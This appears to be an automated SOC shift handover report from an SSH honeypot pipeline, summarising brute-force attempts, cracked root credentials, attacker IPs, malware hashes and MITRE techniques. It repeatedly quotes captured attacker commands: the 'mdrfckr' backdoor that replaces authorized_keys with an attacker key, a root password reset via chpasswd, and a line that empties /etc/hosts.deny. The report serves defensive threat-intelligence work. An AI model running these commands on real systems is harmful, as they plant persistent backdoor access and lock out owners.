# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T05:18:38Z |
| **Shift Time** | 05:18 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **111** |
| Confirmed Threats | **107** |
| False Positives Filtered | **4** (3.6%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **15** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **106** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **65** |
| Unique Usernames | **58** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `ubnt` | 3 |
| `admin` | 2 |
| `sumit` | 2 |
| `user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 5 |
| `123456` | 4 |
| `12345` | 3 |
| `123` | 3 |
| `password` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `ubnt` | `ubnt2010` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `admin` | `123321` | 1 |
| `git` | `git` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Pass2025` | `14.103.120.130` | 2026-03-22T04:17:22 |
| `root` | `P@ss1234` | `183.91.11.36` | 2026-03-22T04:48:19 |
| `root` | `3245gs5662d34` | `183.91.11.36` | 2026-03-22T04:48:22 |
| `root` | `Cisco@123` | `183.91.11.36` | 2026-03-22T05:00:18 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:SVFYDd2u6KFE"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.120.130`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.91.11.36`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **27** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS328847` | THE KONZA TECHNOPOLIS DEVELOPMENT AUTHORITY | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0d3cda868b32

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-03-22 04:17 |
| **Last Seen** | 2026-03-22 04:17 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SVFYDd2u6KFE"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 04:17:21` | `cowrie.session.connect` |
| `2026-03-22 04:17:21` | `cowrie.client.version` |
| `2026-03-22 04:17:21` | `cowrie.client.kex` |
| `2026-03-22 04:17:22` | `cowrie.login.success` |
| `2026-03-22 04:17:22` | `cowrie.session.params` |
| `2026-03-22 04:17:22` | `cowrie.command.input` |
| `2026-03-22 04:17:22` | `cowrie.command.failed` |
| `2026-03-22 04:17:23` | `cowrie.log.closed` |
| `2026-03-22 04:17:23` | `cowrie.session.params` |
| `2026-03-22 04:17:23` | `cowrie.command.input` |
| `2026-03-22 04:17:23` | `cowrie.session.file_download` |
| `2026-03-22 04:17:23` | `cowrie.log.closed` |
| `2026-03-22 04:17:40` | `cowrie.session.params` |
| `2026-03-22 04:17:40` | `cowrie.command.input` |
| `2026-03-22 04:17:40` | `cowrie.log.closed` |
| `2026-03-22 04:17:40` | `cowrie.session.params` |
| `2026-03-22 04:17:40` | `cowrie.command.input` |
| `2026-03-22 04:17:40` | `cowrie.log.closed` |
| `2026-03-22 04:17:40` | `cowrie.session.params` |
| `2026-03-22 04:17:40` | `cowrie.command.input` |
| `2026-03-22 04:17:41` | `cowrie.session.file_download` |
| `2026-03-22 04:17:41` | `cowrie.log.closed` |
| `2026-03-22 04:17:41` | `cowrie.session.params` |
| `2026-03-22 04:17:41` | `cowrie.command.input` |
| `2026-03-22 04:17:41` | `cowrie.log.closed` |
| `2026-03-22 04:17:41` | `cowrie.session.params` |
| `2026-03-22 04:17:41` | `cowrie.command.input` |
| `2026-03-22 04:17:42` | `cowrie.log.closed` |
| `2026-03-22 04:17:42` | `cowrie.session.params` |
| `2026-03-22 04:17:42` | `cowrie.command.input` |
| `2026-03-22 04:17:42` | `cowrie.command.input` |
| `2026-03-22 04:17:42` | `cowrie.log.closed` |
| `2026-03-22 04:17:43` | `cowrie.session.params` |
| `2026-03-22 04:17:43` | `cowrie.command.input` |
| `2026-03-22 04:17:43` | `cowrie.log.closed` |
| `2026-03-22 04:17:43` | `cowrie.session.params` |
| `2026-03-22 04:17:43` | `cowrie.command.input` |
| `2026-03-22 04:17:43` | `cowrie.log.closed` |
| `2026-03-22 04:17:44` | `cowrie.session.params` |
| `2026-03-22 04:17:44` | `cowrie.command.input` |
| `2026-03-22 04:17:44` | `cowrie.log.closed` |
| `2026-03-22 04:17:44` | `cowrie.session.params` |
| `2026-03-22 04:17:44` | `cowrie.command.input` |
| `2026-03-22 04:17:44` | `cowrie.log.closed` |
| `2026-03-22 04:17:45` | `cowrie.session.params` |
| `2026-03-22 04:17:45` | `cowrie.command.input` |
| `2026-03-22 04:17:45` | `cowrie.log.closed` |
| `2026-03-22 04:17:46` | `cowrie.session.params` |
| `2026-03-22 04:17:46` | `cowrie.command.input` |
| `2026-03-22 04:17:46` | `cowrie.log.closed` |
| `2026-03-22 04:17:46` | `cowrie.session.params` |
| `2026-03-22 04:17:46` | `cowrie.command.input` |
| `2026-03-22 04:17:47` | `cowrie.log.closed` |
| `2026-03-22 04:17:47` | `cowrie.session.params` |
| `2026-03-22 04:17:47` | `cowrie.command.input` |
| `2026-03-22 04:17:47` | `cowrie.log.closed` |
| `2026-03-22 04:17:48` | `cowrie.session.params` |
| `2026-03-22 04:17:48` | `cowrie.command.input` |
| `2026-03-22 04:17:48` | `cowrie.log.closed` |
| `2026-03-22 04:17:48` | `cowrie.session.params` |
| `2026-03-22 04:17:48` | `cowrie.command.input` |
| `2026-03-22 04:17:48` | `cowrie.log.closed` |
| `2026-03-22 04:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669835d3d2dc

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-03-22 04:48 |
| **Last Seen** | 2026-03-22 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 04:48:19` | `cowrie.session.connect` |
| `2026-03-22 04:48:19` | `cowrie.client.version` |
| `2026-03-22 04:48:19` | `cowrie.client.kex` |
| `2026-03-22 04:48:19` | `cowrie.login.success` |
| `2026-03-22 04:48:19` | `cowrie.session.params` |
| `2026-03-22 04:48:19` | `cowrie.command.input` |
| `2026-03-22 04:48:19` | `cowrie.command.failed` |
| `2026-03-22 04:48:19` | `cowrie.log.closed` |
| `2026-03-22 04:48:20` | `cowrie.session.params` |
| `2026-03-22 04:48:20` | `cowrie.command.input` |
| `2026-03-22 04:48:20` | `cowrie.session.file_download` |
| `2026-03-22 04:48:20` | `cowrie.log.closed` |
| `2026-03-22 04:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218838d9264c

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-03-22 04:48 |
| **Last Seen** | 2026-03-22 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 04:48:21` | `cowrie.session.connect` |
| `2026-03-22 04:48:21` | `cowrie.client.version` |
| `2026-03-22 04:48:22` | `cowrie.client.kex` |
| `2026-03-22 04:48:22` | `cowrie.login.success` |
| `2026-03-22 04:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfb4ccbafe3

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-03-22 05:00 |
| **Last Seen** | 2026-03-22 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 05:00:17` | `cowrie.session.connect` |
| `2026-03-22 05:00:17` | `cowrie.client.version` |
| `2026-03-22 05:00:17` | `cowrie.client.kex` |
| `2026-03-22 05:00:18` | `cowrie.login.success` |
| `2026-03-22 05:00:18` | `cowrie.session.params` |
| `2026-03-22 05:00:18` | `cowrie.command.input` |
| `2026-03-22 05:00:18` | `cowrie.command.failed` |
| `2026-03-22 05:00:18` | `cowrie.log.closed` |
| `2026-03-22 05:00:18` | `cowrie.session.params` |
| `2026-03-22 05:00:18` | `cowrie.command.input` |
| `2026-03-22 05:00:19` | `cowrie.session.file_download` |
| `2026-03-22 05:00:19` | `cowrie.log.closed` |
| `2026-03-22 05:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469515bb5fe8

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-03-22 05:00 |
| **Last Seen** | 2026-03-22 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 05:00:20` | `cowrie.session.connect` |
| `2026-03-22 05:00:20` | `cowrie.client.version` |
| `2026-03-22 05:00:20` | `cowrie.client.kex` |
| `2026-03-22 05:00:21` | `cowrie.login.success` |
| `2026-03-22 05:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `183.91.11[.]36` | **15** | 2026-03-22 04:37 | 2026-03-22 05:12 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.134[.]158` | **12** | 2026-03-22 02:52 | 2026-03-22 03:06 | 18m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `1.214.117[.]218` | **10** | 2026-03-22 04:12 | 2026-03-22 04:38 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.210.148[.]92` | **10** | 2026-03-22 03:33 | 2026-03-22 03:53 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.98[.]88` | **10** | 2026-03-22 03:34 | 2026-03-22 03:36 | 12m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.141.171[.]139` | **9** | 2026-03-22 03:34 | 2026-03-22 03:41 | 12m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **6** | 2026-03-22 03:55 | 2026-03-22 03:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.196.50[.]91` | **3** | 2026-03-22 04:11 | 2026-03-22 04:20 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `80.15.177[.]203` | **3** | 2026-03-22 03:56 | 2026-03-22 03:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]130` | **2** | 2026-03-22 04:17 | 2026-03-22 04:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `1.30.20[.]98` | 1 | 2026-03-22 05:00 | 2026-03-22 05:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]36` | 1 | 2026-03-22 04:18 | 2026-03-22 04:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.147.248[.]23` | 1 | 2026-03-22 02:37 | 2026-03-22 02:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.39.167[.]59` | 1 | 2026-03-22 03:08 | 2026-03-22 03:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-22 04:27 | 2026-03-22 04:27 | 8s | 0 | `T1592` | 🟢 LOW |
| `120.48.109[.]59` | 1 | 2026-03-22 03:08 | 2026-03-22 03:08 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.186.18[.]3` | 1 | 2026-03-22 02:56 | 2026-03-22 02:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.133.10[.]66` | 1 | 2026-03-22 04:55 | 2026-03-22 04:55 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.17.185[.]94` | 1 | 2026-03-22 04:39 | 2026-03-22 04:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.215.199[.]37` | 1 | 2026-03-22 03:03 | 2026-03-22 03:03 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.210.74[.]19` | 1 | 2026-03-22 05:15 | 2026-03-22 05:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-03-22 02:57 | 2026-03-22 02:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.227[.]2` | 1 | 2026-03-22 03:33 | 2026-03-22 03:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.215.204[.]109` | 1 | 2026-03-22 03:27 | 2026-03-22 03:27 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.242.170[.]10` | 1 | 2026-03-22 04:20 | 2026-03-22 04:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.54.242[.]253` | 1 | 2026-03-22 03:43 | 2026-03-22 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.244.43[.]19` | 1 | 2026-03-22 03:52 | 2026-03-22 03:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]227` | 1 | 2026-03-22 02:29 | 2026-03-22 02:29 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]109` | 1 | 2026-03-22 02:44 | 2026-03-22 02:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.2.221[.]162` | 1 | 2026-03-22 02:48 | 2026-03-22 02:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.196.152[.]22` | 1 | 2026-03-22 04:08 | 2026-03-22 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-22 05:13 | 2026-03-22 05:13 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `80.15.177[.]203` | FR | LNPUT658 Puteaux | **100** ⚠️ | 7 |
| `124.133.10[.]66` | CN | JINAN SONGJIAN NETBAR | **100** ⚠️ | 18 |
| `122.186.18[.]3` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 6 |
| `219.244.43[.]19` | CN | China Education and Research Network | **100** ⚠️ | 2 |
| `197.242.170[.]10` | MZ | IS - Internet Solutions Mozambique, Limitada | **100** ⚠️ | 50 |
| `180.184.134[.]158` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `111.39.167[.]59` | CN | China Mobile Communications Corporation | **100** ⚠️ | 49 |
| `103.147.248[.]23` | IN | Softcrop It | **100** ⚠️ | 37 |
| `120.48.109[.]59` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 10 |
| `1.30.20[.]98` | CN | China unicom InnerMongolia province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 101 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 111 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 32 recon entry/entries in table (10 group(s) consolidating 80 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T05:18:38Z_
